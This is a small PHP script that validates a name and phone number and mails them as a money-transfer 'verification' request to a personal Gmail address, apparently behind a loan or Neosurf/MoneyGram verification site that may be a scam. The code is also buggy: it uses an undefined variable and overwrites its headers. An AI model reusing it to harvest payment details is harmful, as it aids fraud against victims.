<?php

unset($error);
foreach ($_REQUEST as $k => $v) {
	$_REQUEST[$k] = urldecode(trim($v));
}
 //$lib->debug($_REQUEST);

if (isset($_REQUEST)) {
	$firstname = $_REQUEST['firstname'];
	
	$phone_number = $_REQUEST['phone_number'];
	
	


	//  var_dump($profile_user);
	// die;s
	if (empty(trim($firstname))) {
		echo "false||Veuillez renseigner votre nom";
		exit;
	} elseif (empty(trim($phone_number))) {
		echo "false||Veuillez renseigner votre numéro de téléphone";
		exit;
	} elseif (!preg_match('/^[A-Z][\p{L}-]*$/', $firstname)) {
		echo "false||nom invalide";
		exit;
	} elseif (!preg_match('/^[0-9_]+$/', $phone_number)) {
		echo "false||Numéro  incorrect";
		exit;
	} else {
		
		//je fais un envoi par email
		
		///$subject = 'Message Verification NEOSURF';
   $from="info@attestation-de-transfert.com";
     $headers = $from . "\r\n" .
     'Reply-To: '.$from.'  "\r\n" '.
     'X-Mailer: PHP/' . phpversion();
     // Always set content-type when sending HTML email
     $headers = "MIME-Version: 1.0" . "\r\n";
	// $headers="Bcc: brancom554@gmail.com"."\r\n";
     $headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
     
   
    $message ="<html><head></head><body>
<b>DEMANDE DE VERIFICATION MG -  DE ".$nom."&nbsp; </b><br>
<br>
Bonjour, 
Vous avez un nouveau message provenant du site web.<br>
REFERENCE: ".$phone_number."<br>
NOM ET PRENOM: ".$firstname."<br>

.
</body></html>";



mail("brancom554@gmail.com", "Demande de prêt", $message, $headers);
//fin ajout mail
		
		
		
		echo "true||Votre vérification est en cours. Veuillez patienter.Merci.";
		exit;
		//fin envoi par email
		//
		
			} 
		}
	

////exit;

function normalize($string)
{
	$table = array(
		'Š' => 'S', 'š' => 's', 'Ð' => 'Dj', 'd' => 'dj', 'Ž' => 'Z', 'ž' => 'z', 'C' => 'C', 'c' => 'c', 'C' => 'C', 'c' => 'c',
		'À' => 'A', 'Á' => 'A', 'Â' => 'A', 'Ã' => 'A', 'Ä' => 'A', 'Å' => 'A', 'Æ' => 'A', 'Ç' => 'C', 'È' => 'E', 'É' => 'E',
		'Ê' => 'E', 'Ë' => 'E', 'Ì' => 'I', 'Í' => 'I', 'Î' => 'I', 'Ï' => 'I', 'Ñ' => 'N', 'Ò' => 'O', 'Ó' => 'O', 'Ô' => 'O',
		'Õ' => 'O', 'Ö' => 'O', 'Ø' => 'O', 'Ù' => 'U', 'Ú' => 'U', 'Û' => 'U', 'Ü' => 'U', 'Ý' => 'Y', 'Þ' => 'B', 'ß' => 'Ss',
		'à' => 'a', 'á' => 'a', 'â' => 'a', 'ã' => 'a', 'ä' => 'a', 'å' => 'a', 'æ' => 'a', 'ç' => 'c', 'è' => 'e', 'é' => 'e',
		'ê' => 'e', 'ë' => 'e', 'ì' => 'i', 'í' => 'i', 'î' => 'i', 'ï' => 'i', 'ð' => 'o', 'ñ' => 'n', 'ò' => 'o', 'ó' => 'o',
		'ô' => 'o', 'õ' => 'o', 'ö' => 'o', 'ø' => 'o', 'ù' => 'u', 'ú' => 'u', 'û' => 'u', 'ý' => 'y', 'ý' => 'y', 'þ' => 'b',
		'ÿ' => 'y', 'R' => 'R', 'r' => 'r',
	);

	return strtr($string, $table);
}
